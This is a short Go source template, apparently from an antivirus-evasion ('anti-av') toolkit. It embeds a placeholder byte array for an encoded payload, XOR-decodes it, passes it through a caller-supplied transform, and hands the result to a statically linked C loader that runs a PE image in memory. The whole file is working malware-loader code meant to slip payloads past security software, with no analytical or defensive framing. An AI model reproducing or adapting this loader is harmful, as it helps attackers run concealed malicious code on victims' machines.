package pe

// #cgo CFLAGS: -I${SRCDIR}/pe
// #cgo LDFLAGS: -L${SRCDIR} -lpe -lstdc++ --static
// #include "loader.h"
import "C"

import (
	"unsafe"

	"github.com/b1gcat/anti-av/apps/av/utils"
)

var (
	Code = []byte{ {{.CODE}} }
)

func Hi(p func([]byte) ([]byte, error)) error {
	var err error

	kek := utils.Kek(Code[4:])
	for k := range kek {
		Code[k] ^= kek[k]
	}

	if Code, err = p(Code); err != nil {
		return err
	}
	
	C.pe((*C.uchar)(unsafe.Pointer(&Code[0])), C.uint(len(Code)))
	return nil
}
